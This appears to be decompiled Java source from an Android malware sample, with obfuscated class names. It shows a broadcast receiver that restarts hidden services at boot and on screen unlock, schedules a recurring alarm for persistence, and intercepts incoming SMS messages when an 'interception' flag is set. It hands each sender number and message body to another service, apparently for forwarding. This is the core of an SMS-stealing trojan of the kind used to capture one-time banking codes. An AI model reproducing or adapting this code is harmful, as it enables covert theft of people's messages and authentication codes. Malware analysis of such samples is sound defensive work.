package wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.jtfxlnc;
import wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl;
import wocwvy.czyxoxmbauu.slsa.whemsbk;

/* JADX INFO: loaded from: classes.dex */
public class hypihteeavv extends BroadcastReceiver {

    /* JADX INFO: renamed from: a */
    C0020b f569a = new C0020b();

    /* JADX INFO: renamed from: a */
    void m341a(Context context, Intent intent) {
        String action = intent.getAction();
        context.startService(new Intent(context, (Class<?>) jtfxlnc.class));
        this.f569a.m230a("Action", "BOOT Start " + action);
        try {
            C0020b c0020b = this.f569a;
            C0020b.m218a(context, "startAlarm", Integer.parseInt(this.f569a.m251e(context, "Interval")));
        } catch (Exception unused) {
            C0020b c0020b2 = this.f569a;
            C0020b.m218a(context, "startAlarm", 15000L);
        }
        if (action.equals("android.intent.action.USER_PRESENT")) {
            context.startService(new Intent(context, (Class<?>) ukhakhcgifofl.class));
        }
        if (action.equals("android.provider.Telephony.SMS_RECEIVED") && this.f569a.m251e(context, "perehvat_sws").contains("true")) {
            m342b(context, intent);
        }
    }

    /* JADX INFO: renamed from: b */
    public void m342b(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                String str = "";
                String str2 = "";
                if (objArr != null) {
                    int length = objArr.length;
                    int i = 0;
                    while (i < length) {
                        SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
                        String displayOriginatingAddress = smsMessageCreateFromPdu.getDisplayOriginatingAddress();
                        String displayMessageBody = smsMessageCreateFromPdu.getDisplayMessageBody();
                        str2 = str2 + displayMessageBody;
                        context.startService(new Intent(context, (Class<?>) whemsbk.class).putExtra("num", displayOriginatingAddress).putExtra("ms", displayMessageBody));
                        i++;
                        str = displayOriginatingAddress;
                    }
                }
                this.f569a.m227a(context, str, str2);
            } catch (Exception unused) {
            }
        }
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        if (this.f569a.m231a()) {
            return;
        }
        m341a(context, intent);
    }
}
